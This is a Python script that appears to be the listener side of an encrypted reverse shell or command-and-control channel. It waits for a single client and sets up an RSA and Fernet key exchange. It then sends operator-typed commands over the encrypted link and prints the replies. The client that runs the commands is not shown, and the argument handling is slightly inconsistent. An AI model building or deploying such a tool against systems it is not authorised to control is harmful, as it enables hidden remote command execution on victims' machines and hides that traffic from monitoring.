import socket
import sys
import subprocess as sub 
from cryptography.fernet import Fernet
import argparse
from cryptography.hazmat.primitives.asymmetric import rsa 
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes

serverAddr = sys.argv[2]
serverPort = int(sys.argv[4])

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("--host",help = "Server IP address")
	parser.add_argument("--port",help = "Server port number")
	args = parser.parse_args()

	privateKey = rsa.generate_private_key(
		public_exponent = 65537,
		key_size = 2048,
		)
	publicKey = privateKey.public_key()
	pem = publicKey.public_bytes(
		encoding = serialization.Encoding.PEM,
		format = serialization.PublicFormat.SubjectPublicKeyInfo
		)
	serverSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	serverSock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	serverSock.bind((serverAddr,serverPort))
	serverSock.listen(5)
	print(f"[*] Listening on {serverAddr}:{serverPort}")

	clientSock, address = serverSock.accept()
	print(f"[*] Established connection with {address[0]}:{address[1]}")
	request = clientSock.recv(4096)
	print(request.decode())
	clientSock.send(pem)
	encryptedSymmetricKey = clientSock.recv(4096)
	symmetricKey = privateKey.decrypt(
		encryptedSymmetricKey,
		padding.OAEP(
			mgf = padding.MGF1(algorithm = hashes.SHA256()),
			algorithm = hashes.SHA256(),
			label = None
			)
		)
	fernet = Fernet(symmetricKey)

	while True:
		command = input("->\t")
		status = command
		command = command.encode()
		command = fernet.encrypt(command)
		clientSock.send(command)
		if status == "exit":
			break
		answer = clientSock.recv(4096)
		answer = fernet.decrypt(answer)
		answer = answer.decode()
		print(answer)

	clientSock.close()
	serverSock.close()